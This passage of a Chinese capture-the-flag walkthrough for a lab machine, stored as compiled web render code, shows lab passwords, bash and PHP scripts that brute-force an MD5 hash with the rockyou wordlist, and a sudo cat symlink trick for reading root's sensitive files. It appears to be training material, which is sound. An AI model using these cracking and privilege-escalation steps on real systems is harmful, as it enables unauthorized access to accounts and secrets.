operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("\n\n000000001:   "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("404")]),s._v("        "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("9")]),s._v(" L      "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("31")]),s._v(" W       "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("271")]),s._v(" Ch      "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"peqkSBCDKvVxxNwcq1j4"')]),s._v("\n\nTotal time: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\nProcessed Requests: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\nFiltered Requests: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\nRequests/sec.: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br")])]),a("blockquote",[a("p",[s._v("user9 : peqkSBCDKvVxxNwcq1j4")])]),s._v(" "),a("h2",{attrs:{id:"user10-md5sum-爆破密码"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#user10-md5sum-爆破密码"}},[s._v("#")]),s._v(" user10 md5sum 爆破密码")]),s._v(" "),a("p",[s._v("user9用户可以无密码使用 user10 的 md5sum 命令")]),s._v(" "),a("p",[a("img",{attrs:{src:"img/20.png",alt:""}})]),s._v(" "),a("p",[s._v("md5sum 可以计算字符串/文件的md5值")]),s._v(" "),a("p",[s._v("哈希算法不可逆，只能大量爆破，找出相同md5值的字符串")]),s._v(" "),a("p",[s._v("可以看看 user10 家目录的 password.txt 的文件大小是 13 字节")]),s._v(" "),a("p",[a("img",{attrs:{src:"img/21.png",alt:""}})]),s._v(" "),a("p",[s._v("可以通过测试发现一个小细节")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(".txt\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("11")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(".txt\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("111")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(".txt\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-lah")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[a("img",{attrs:{src:"img/22.png",alt:""}})]),s._v(" "),a("p",[s._v("可以看到 echo 出来的内容会多一个换行符，占用多一个字节")]),s._v(" "),a("p",[a("img",{attrs:{src:"img/23.png",alt:""}})]),s._v(" "),a("p",[s._v("如果 echo 重定向时 使用 -n 参数 就不会多出换行符，在 user9 目录里用几个测试文件演示")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("user9@SudoHome:~$ "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-n")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'1'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(".txt\nuser9@SudoHome:~$ "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-n")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'11'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(".txt\nuser9@SudoHome:~$ "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-n")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'111'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(".txt\nuser9@SudoHome:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-alh")]),s._v("\ntotal 48K\ndrwxr-xr-x  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(" user9 user9 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("19")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10")]),s._v(":22 "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),s._v("\ndrwxr-xr-x "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("12")]),s._v(" root  root  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(" 08:35 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("\n-rw-r--r--  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" user9 user9    "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("19")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10")]),s._v(":26 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(".txt        \n-rw-r--r--  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" user9 user9    "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("19")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10")]),s._v(":26 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(".txt        \n-rw-r--r--  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" user9 user9    "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(" Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("19")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10")]),s._v(":27 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(".txt        \n-rw-------  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" user9 user9 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(".3K Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("17")]),s._v(" 03:21 .bash_history\n-rw-r--r--  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" user9 user9  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("220")]),s._v(" Apr "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("18")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v(" .bash_logout \n-rw-r--r--  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" user9 user9 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(".5K Apr "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("18")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v(" .bashrc      \ndrwxr-xr-x  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(" user9 user9 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("13")]),s._v(":01 .config      \n-rw-------  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" user9 user9   "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("21")]),s._v(" Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(" 08:35 password.txt \n-rw-r--r--  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" user9 user9  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("807")]),s._v(" Apr "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("18")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v(" .profile     \ndrwx------  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" user9 user9 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("13")]),s._v(":25 .ssh\nuser9@SudoHome:~$\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br")])]),a("p",[a("img",{attrs:{src:"img/24.png",alt:""}})]),s._v(" "),a("p",[s._v("那么 user10 的 password.txt 是 13 字节，那么内容应该是 12 个字符 + 1 个换行符，或者者 13 个字符没有换行符，大概率是 12 个字符 + 1 个换行符（猜测）")]),s._v(" "),a("p",[s._v("常见字典中的密码行末一般带一个换行符，因此“文件中一行密码 + 换行”就是 N 字符 + \\n；尝试从 rockyou.txt 里筛选出 12 个字符的密码进行爆破")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" rockyou.txt"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("awk")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'length($0)==12'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" pass.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("bash脚本爆破")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("while")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("read")]),s._v(" p"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("do")]),s._v(" \n  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# echo 默认会自动加换行符，正好符合 13 字节的要求")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$p")]),s._v('"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" md5sum "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("grep")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"65e31d336be184593812c18533fa4fa2"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"密码是: '),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$p")]),s._v('"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("break")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("done")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v(" pass.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/25.png",alt:""}})]),s._v(" "),a("blockquote",[a("p",[s._v("user10 : morrinsville")])]),s._v(" "),a("p",[s._v("或者选择php、python语言遍历rockyou.txt，其他语言也可以")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$targetHash")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'65e31d336be184593812c18533fa4fa2'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$start_time")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("microtime")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("true")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'/usr/share/wordlists/rockyou.txt'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$handle")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("fopen")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"r"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$handle")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("while")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$line")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("fgets")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$handle")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!==")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("false")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("md5")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$line")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("===")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$targetHash")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$end_time")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("microtime")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("true")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$elapsed_time")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$end_time")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$start_time")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"Found: "')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$line")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"Time elapsed: "')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("round")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$elapsed_time")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('" seconds\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("fclose")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$handle")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("exit")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("fclose")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$handle")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$end_time")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("microtime")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("true")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$elapsed_time")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$end_time")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$start_time")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"Not found.\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"Search completed in: "')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("round")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$elapsed_time")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('" seconds\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/28.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"root-王炸"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#root-王炸"}},[s._v("#")]),s._v(" root 王炸")]),s._v(" "),a("p",[s._v("user10用户可以无密码使用 root 的 cat 命令")]),s._v(" "),a("p",[s._v("有个小细节，当前在 /home/user10 目录下，是自己的家目录，只要对某个目录有写权限，就可以在该目录中创建、删除、重命名，即使是 root 用户的文件")]),s._v(" "),a("p",[s._v("sudo 可以使用 cat 读取指定文件 .important，我们有权限删掉 .important 文件，重新做软链接到root用户文件，读取 root 用户敏感文件")]),s._v(" 